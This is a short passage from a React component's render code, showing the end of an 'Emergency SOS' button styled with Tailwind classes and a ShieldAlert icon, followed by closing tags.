            className="px-6 py-2.5 bg-red-600 hover:bg-red-500 text-white font-bold text-xs rounded-xl shadow-lg shadow-red-950 flex items-center space-x-2"
          >
            <ShieldAlert className="w-4 h-4" />
            <span>Emergency SOS</span>
          </button>
        </div>
      )}

    </div>
  );
};
